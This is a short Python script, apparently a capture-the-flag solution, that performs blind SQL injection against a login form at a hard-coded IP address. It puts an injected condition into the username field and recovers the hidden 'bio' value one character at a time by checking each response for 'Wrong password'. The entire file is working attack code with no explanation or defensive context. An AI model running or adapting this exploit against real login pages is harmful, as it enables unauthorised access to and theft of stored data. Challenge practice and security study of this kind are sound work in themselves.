import requests
import string 

dict = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{"+"}" + "_"
flag=''
j = 0
while True:
    j += 1
    for i in range(0,255):
        a = f"admin343' and {i}=ascii(substr(bio,{j},1));#"
        print(a)
        b ='a'
        url = "http://34.132.132.69:8000/"
        burp0_data = {"username": a, "password": b}
        r=requests.post(url,data=burp0_data)
                
        if "Wrong password" in r.text:
            print('--')
            flag = flag + str(chr(i))
            print(flag)
            print('--')
            break
